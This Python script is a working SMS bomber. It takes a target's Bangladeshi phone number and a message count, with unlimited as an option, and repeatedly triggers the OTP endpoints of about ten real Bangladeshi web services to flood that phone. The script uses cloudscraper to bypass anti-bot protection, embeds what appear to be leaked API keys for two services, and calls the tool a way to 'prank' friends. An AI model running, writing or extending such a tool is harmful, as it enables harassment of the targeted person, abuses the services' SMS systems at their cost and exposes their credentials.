from cloudscraper import create_scraper
from shutil import get_terminal_size
from colorama import Fore
from random import choice
from time import sleep
import requests
import sys, os

# FUNCTIONS ====================================

def print_animated(text, delay=0.04):
	for x in text:
	    print(x, end='')
	    sys.stdout.flush()
	    sleep(delay)

def print_center(*values, left=1, **kwargs):
	columns = get_terminal_size().columns
	print(' '.join(list(values)).center(columns-left), **kwargs)

def clear():
	if os.name=='nt':
		os.system('cls')
	else:
		os.system('clear')

def supports_color():
    plat = sys.platform
    supported_platform = plat != 'Pocket PC' and (plat != 'win32' or 'ANSICON' in os.environ)
    is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
    return supported_platform and is_a_tty

def banner():
	clear()
	chars=['$', '#', '@', '%', '&']
	b=[
	r'                                                                            ',
	r' /$$$$$$                                   /$$                              ',
	r'|_  $$_/                                  | $$                              ',
	r'  | $$   /$$$$$$/$$$$   /$$$$$$  /$$   /$$| $$  /$$$$$$$  /$$$$$$   /$$$$$$ ',
	r'  | $$  | $$_  $$_  $$ /$$__  $$| $$  | $$| $$ /$$_____/ /$$__  $$ /$$__  $$',
	r'  | $$  | $$ \ $$ \ $$| $$  \ $$| $$  | $$| $$|  $$$$$$ | $$$$$$$$| $$  \__/',
	r'  | $$  | $$ | $$ | $$| $$  | $$| $$  | $$| $$ \____  $$| $$_____/| $$      ',
	r' /$$$$$$| $$ | $$ | $$| $$$$$$$/|  $$$$$$/| $$ /$$$$$$$/|  $$$$$$$| $$      ',
	r'|______/|__/ |__/ |__/| $$____/  \______/ |__/|_______/  \_______/|__/      ',
	r'                      | $$                                                  ',
	r'                      | $$                                                  ',
	r'                      |__/                                                  ',
	r'                                                                            ']
	char=choice(chars)
	for line in b:
		print_center(choice(colors)+line.replace('$', char))
	if supports_color():
		print_center(colors[3]+'Developer: '+colors[1]+'Technical Zarir '+colors[3]+'Country: '+colors[1]+'Bangladesh', left=-15)
	else:
		print_center('Developer: Technical Zarir Country: Bangladesh')
	print('')

def get(url, params=None, max=10, cloudscraper=False, **kwargs):
	err=0
	while err<max:
		try:
			if cloudscraper:
				request=create_scraper()
				out=request.get(url, params=params, **kwargs)
			else:
				out=requests.get(url, params=params, **kwargs)
			return out
		except KeyboardInterrupt:
			leave(total, sent, failed)
		except:
			err+=1
	nointernet()

def post(url, data=None, json=None, max=10, cloudscraper=False, **kwargs):
	err=0
	while err<max:
		try:
			if cloudscraper:
				request=create_scraper()
				out=request.post(url, data=data, json=json, **kwargs)
			else:
				out=requests.post(url, data=data, json=json, **kwargs)
			return out
		except KeyboardInterrupt:
			leave(total, sent, failed)
		except:
			err+=1
	nointernet()

def show_in_progress(total, sent, failed):
	banner()
	print_center(colors[3]+'Total attempt :', str(total), 'times')
	if supports_color():
		print_center(colors[1]+'Sent          :', str(sent), 'SMS  ')
		print_center(colors[0]+'Failed        :', str(failed), 'SMS  ')
	else:
		print_center(colors[1]+'Sent          :', str(sent), 'SMS  ')
		print_center(colors[0]+'Failed        :', str(failed), 'SMS  ')

def leave(total, sent, failed):
	banner()
	show_in_progress(total, sent, failed)
	if supports_color():
		print(colors[1])
		print_center('Thanks for using my tool!      ')
		print_center('Find me at: linktr.ee/zariradvance      ')
	else:
		print(colors[1])
		print_center('Thanks for using my tool!')
		print_center('Find me at: linktr.ee/zariradvance')
	sys.exit()

def nointernet():
	banner()
	print(colors[0]+'Something went wrong with your internet connection.\nPlease try again later...')
	sys.exit()

def ctrlc():
	banner()
	print(colors[1]+'Exitting...')
	sys.exit()

def commit(success:bool):
	global total, sent, failed

	if success==True:
		total+=1
		sent+=1
	elif success==False:
		total+=1
		failed+=1
	if sent>=amount:
		leave(total, sent, failed)
	show_in_progress(total, sent, failed)

# MAIN ====================================

if supports_color():
	colors=[Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX]
else:
	colors=['', '', '', '', '', '', '', '']

num_err='[-] Please enter a valid number. Eg: 01618437492'
amount_err='[-] Please enter only digits. Eg: 50'
mode_err='[-] Please enter your selection between 1, 2 & 3'
faq='What\'s difference between Rapid and Powered Mode?\nAns: Rapid Mode uses those api which are fast and unlimited. There is more success rate in Rapid Mode than Powered Mode. In the other hand, Powered Mode uses every api (even which apis has limits). Because of that, this mode is slow and there is more fail counter in Powered Mode than Rapid Mode. My recommendation is if you want to gain sms to showoff, you should use Rapid Mode. Else, if you want to prank your friend with huge amount of sms, please choose Powered Mode. Thanks'

try:
	while True:
		banner()
		print_animated(colors[1]+'[*] Enter target number: +88')
		number=str(input())
		if not number.isdigit():
			print(colors[0]+num_err)
		elif len(number)!=11:
			print(colors[0]+num_err)
		elif number[:2]!='01':
			print(colors[0]+num_err)
		else:
			break
		sleep(1)

	while True:
		banner()
		print_animated(colors[1]+'[*] Enter SMS amount (0 for unlimited): ')
		amount=str(input())
		if not amount.isdigit():
			print(colors[0]+amount_err)
		elif amount=='0':
			amount=999999999
			break
		else:
			amount=int(amount)
			break
		sleep(1)

	while True:
		banner()
		print_animated(colors[1]+'Select any mode:\n  1. Rapid Mode\n  2. Powered Mode\n  3. Help\n[*] Enter your selection (1/2/3): ', delay=0.03)
		option=str(input())
		if option == '1':
			mode='rapid'
			break
		elif option == '2':
			mode='powered'
			break
		elif option == '3':
			banner()
			print_animated(colors[1]+faq, delay=0.005)
			input('\n\nPress enter to back')
		else:
			print(colors[0]+mode_err)
		sleep(1)
except KeyboardInterrupt:
	ctrlc()
except Exception as e:
	print(colors[0]+e)

total=0
sent=0
failed=0

#====================== BINGE =======================================
# UNLIMITED
binge_url = "https://web-api.binge.buzz/api/v2/otp/send"
binge_headers = {'Device-Type': 'web', 'Content-Type': 'application/json'}
binge_data = '{"phone":"+88'+number+'"}'
binge_identifier= 'OTP sent successfully'
#====================== BYJUS =======================================
byjus_url='https://students.byjus.com/mobiles/request_otp?mobile=%2B880-'+number
byjus_identifier='OTP sent'
#====================== AGORA =======================================
# UNLIMITED
agora_url = "https://agorasuperstores.com/customers/send_sms"
agora_data = "mobile_number="+number
agora_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
# Identifier is make sure the response is digit
#====================== SHAJGOJ =====================================
shajgoj_url = "https://shop.shajgoj.com/wp-admin/admin-ajax.php"
shajgoj_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
shajgoj_data = "action=xoo_ml_login_with_otp&xoo-ml-phone-login="+number
shajgoj_identifier='"otp_sent":1'
#====================== BONGO =======================================
bongo_url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
bongo_headers = {'Content-Type': 'application/json'}
bongo_data = '{"operator":"all","msisdn":"'+number+'"}'
bongo_identifier='success'
#====================== FUNDESH =====================================
fundesh_url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
fundesh_headers = {'Content-Type': 'application/json'}
fundesh_data = '{"msisdn":"'+number[1:]+'"}'
fundesh_identifier='OTP_SENT_SUCCESS'
#====================== FUNDESH RESEND ==============================
fundesh_resend_url = "https://fundesh.com.bd/api/auth/resendOTP"
fundesh_resend_headers = {'Content-Type': 'application/json'}
fundesh_resend_data = '{"msisdn":"'+number[1:]+'"}'
fundesh_resend_identifier='OTP_RESEND_SUCCESS'
#====================== HOICHOI =====================================
hoichoi_url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
hoichoi_headers = {'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef', 'Content-Type': 'application/json'}
hoichoi_data = '{"requestType":"send","phoneNumber":"+88'+number+'"}'
hoichoi_identifier='"sent":"true"'
#====================== BIOSCOPE ====================================
bioscope_url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
bioscope_identifier='SUCCESS'
#====================== SWAP ========================================
swap_url = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
swap_headers = {'x-authorization': 'QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3', 'Content-Type': 'application/json'}
swap_data = '{"mobile_number":"'+number+'","referral":false}'
swap_identifier='"success":true'
#====================== PICKABOO ====================================
# Unlimited
pickaboo_url = "https://www.pickaboo.com/smsprofile/otp/send/"
pickaboo_headers = {'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded'}
pickaboo_data = "mobile="+number+"&eventType=customer_signup_otp&resend=0"
pickaboo_identifier='"Success":"success"'
#====================================================================
if mode=='powered':
	while True:
		binge=post(binge_url, headers=binge_headers, data=binge_data)
		if binge_identifier in binge.text:
			commit(True)
		else:
			commit(False)
		byjus=get(byjus_url)
		if byjus_identifier in byjus.text:
			commit(True)
		else:
			commit(False)
		agora=post(agora_url, headers=agora_headers, data=agora_data, cloudscraper=True)
		if agora.text.isdigit():
			commit(True)
		else:
			commit(False)
		shajgoj=post(shajgoj_url, headers=shajgoj_headers, data=shajgoj_data)
		if shajgoj_identifier in shajgoj.text:
			commit(True)
		else:
			commit(False)
		bongo=post(bongo_url, headers=bongo_headers, data=bongo_data)
		if bongo_identifier in bongo.text:
			commit(True)
		else:
			commit(False)
		fundesh=post(fundesh_url, headers=fundesh_headers, data=fundesh_data)
		if fundesh_identifier in fundesh.text:
			commit(True)
		else:
			fundesh_resend = post(fundesh_resend_url, headers=fundesh_resend_headers, data=fundesh_resend_data)
			if fundesh_resend_identifier in fundesh_resend.text:
				commit(True)
			else:
				commit(False)
		hoichoi=post(hoichoi_url, headers=hoichoi_headers, data=hoichoi_data)
		if hoichoi_identifier in hoichoi.text:
			commit(True)
		else:
			commit(False)
		bioscope=get(bioscope_url)
		if bioscope_identifier in bioscope.text:
			commit(True)
		else:
			commit(False)
		swap=post(swap_url, headers=swap_headers, data=swap_data)
		if swap_identifier in swap:
			commit(True)
		else:
			commit(False)
		pickaboo=post(pickaboo_url, headers=pickaboo_headers, data=pickaboo_data)
		if pickaboo_identifier in pickaboo.text:
			commit(True)
		else:
			commit(False)
elif mode=='rapid':
	while True:
		binge=post(binge_url, headers=binge_headers, data=binge_data)
		if binge_identifier in binge.text:
			commit(True)
		else:
			commit(False)
		agora=post(agora_url, headers=agora_headers, data=agora_data, cloudscraper=True)
		if agora.text.isdigit():
			commit(True)
		else:
			commit(False)
		pickaboo=post(pickaboo_url, headers=pickaboo_headers, data=pickaboo_data)
		if pickaboo_identifier in pickaboo.text:
			commit(True)
		else:
			commit(False)



